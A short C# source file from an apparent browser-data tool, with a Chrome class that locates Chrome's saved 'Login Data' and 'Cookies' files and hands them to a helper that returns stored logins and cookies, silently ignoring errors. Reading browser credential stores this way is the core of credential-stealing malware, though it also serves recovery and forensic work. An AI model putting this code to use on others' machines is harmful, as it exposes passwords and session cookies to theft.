using BrowserTools.Base;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BrowserTools
{
    public class Chrome
    {
        public static List<LoginData> GetLoginData()
        {
            try
            {
                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Login Data");

                return Chromium.GetLoginData(dataPath, BrowserName.Chrome);
            } catch (Exception)
            {
                return new List<LoginData>();
            }
        }

        public static List<Cookie> GetCookies()
        {
            try
            {
                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Cookies");

                return Chromium.GetCookies(dataPath, BrowserName.Chrome);
            } catch (Exception)
            {
                return new List<Cookie>();
            }
        }
    }
}
